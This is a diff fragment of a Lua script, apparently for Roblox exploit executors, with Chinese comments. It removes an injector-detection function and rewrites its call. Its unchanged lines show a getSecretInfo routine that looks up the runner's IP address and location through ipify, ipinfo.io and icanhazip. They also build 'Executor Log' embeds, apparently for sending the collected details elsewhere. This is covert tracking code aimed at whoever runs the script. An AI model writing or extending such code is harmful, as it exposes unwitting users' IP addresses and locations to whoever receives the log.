@@ -25,17 +25,6 @@ local function secureRequest(options )
     return nil
 end
 
---// 新增: 偵測注入器的函數
-local function identifyexecutor()
-    if syn then return "Synapse X" end
-    if KRNL_LOADED then return "Krnl" end
-    if getgenv().secure_load then return "Sentinel" end
-    if IsScriptWare then return "Script-Ware" end
-    if is_fluxus_script then return "Fluxus" end
-    if getgenv().coconame then return "Coco Z" end
-    return "Unknown"
-end
-
 --// 獲取 IP 和地理位置的函數
 local function getSecretInfo()
     local ipServices = { "https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com" }
@@ -75,7 +64,8 @@ pcall(function()
     local embeds = {}
 
     -- 5. 創建第一個 embed (注入器資訊)
-    local executorName = identifyexecutor()
+    -- 直接呼叫 identifyexecutor()，如果函數不存在或返回 nil，則顯示 "Unknown"
+    local executorName = (pcall(identifyexecutor) and identifyexecutor()) or "Unknown"
     local executorEmbed = {
         title = "Executor Log:",
         description = string.format("**注入器名稱:** `%s`", executorName),
